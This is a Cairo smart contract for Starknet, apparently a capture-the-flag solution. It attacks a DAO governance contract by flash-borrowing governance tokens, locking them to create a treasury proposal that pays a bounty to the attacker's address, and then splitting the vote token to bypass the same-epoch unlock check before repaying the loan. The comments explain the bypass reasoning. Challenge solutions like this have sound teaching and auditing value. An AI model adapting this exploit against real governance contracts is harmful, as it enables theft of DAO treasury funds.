
#[starknet::interface]
pub trait IShaftoe<TState> {
    fn attack(ref self: TState);
}

#[starknet::interface]
trait IFlashLoanReceiver<TState> {
    fn callback(ref self: TState, borrow_amount: u256);
}


#[starknet::contract]
mod Shaftoe {
    use daolulu::gov_attack::lending_pool::{ILendingPoolDispatcher, ILendingPoolDispatcherTrait};
    use daolulu::gov_attack::voting_contract::{
        IVotingDispatcher, IVotingDispatcherTrait, ProposalType
    };
    use openzeppelin_token::erc20::interface::{IERC20Dispatcher, IERC20DispatcherTrait};
    use starknet::ContractAddress;
    use starknet::storage::{StoragePointerReadAccess, StoragePointerWriteAccess};

    #[storage]
    struct Storage {
        lender: ILendingPoolDispatcher,
        voting: IVotingDispatcher,
        gov_token: IERC20Dispatcher,
        jack: ContractAddress,
        borrow_amount: u256,
        bounty: felt252,
    }

    const DECIMALS: u256 = 1_000_000_000_000_000_000;
    const DECIMALS_FELT: felt252 = 1_000_000_000_000_000_000;

    #[constructor]
    fn constructor(
        ref self: ContractState, 
        jack: ContractAddress, 
        lender: ContractAddress, 
        voting: IVotingDispatcher,
        gov_token: ContractAddress,
    ) {
        self.lender.write(ILendingPoolDispatcher { contract_address: lender });
        self.voting.write(voting);
        self.gov_token.write(IERC20Dispatcher { contract_address: gov_token });
        self.jack.write(jack);
        self.borrow_amount.write(100_000_000 * DECIMALS);
        self.bounty.write(1000 * DECIMALS_FELT);
    }

    #[abi(embed_v0)]
    impl IShaftoeImpl of super::IShaftoe<ContractState> {
        fn attack(ref self: ContractState) {
            self.lender.read().flash_loan(self.borrow_amount.read());
        }
    }

    #[abi(embed_v0)]
    impl IFlashLoanReceiverImpl of super::IFlashLoanReceiver<ContractState> {
        fn callback(ref self: ContractState, borrow_amount: u256) {
            self.gov_token.read().approve(
                self.voting.read().contract_address, 
                self.borrow_amount.read()
            );
            let vote_token_id = self.voting.read().lock_tokens(self.borrow_amount.read());
            let data: Array<felt252> = array![
                self.jack.read().into(), 
                self.bounty.read()
            ];
            let _prop_id = self.voting.read().create_proposal(
                "Totally Legit Proposal",
                ProposalType::TREASURY,
                data.span(),
                vote_token_id
            );

            let amounts = array![50_000_000 * DECIMALS_FELT, 50_000_000 * DECIMALS_FELT];
            let clean_tokens = self.voting.read().split(vote_token_id, amounts.span());
            // Cant unlock tockens because I just voted with them
            // Idea: "Split" the tokens into new tokens with differnt IDs
            // This may be able to bypass the following assertion:
            // assert(voted_in_epoch(token_id) < current_epoch(), 'Voted in this epoch')
            // in the `unlock_tokens` function
            // Looking at the `split` function I need to at least split it into 2 new tokens
            // So I should probably split after proposing, then send back the 2 batches of tokens
            let clean_batch_fst = *clean_tokens[0];
            let clean_batch_snd = *clean_tokens[1];
            self.voting.read().unlock_tokens(clean_batch_fst.into());
            self.voting.read().unlock_tokens(clean_batch_snd.into());

            self.gov_token.read().transfer(
                self.lender.read().contract_address, 
                self.borrow_amount.read()
            );
        }
    }
}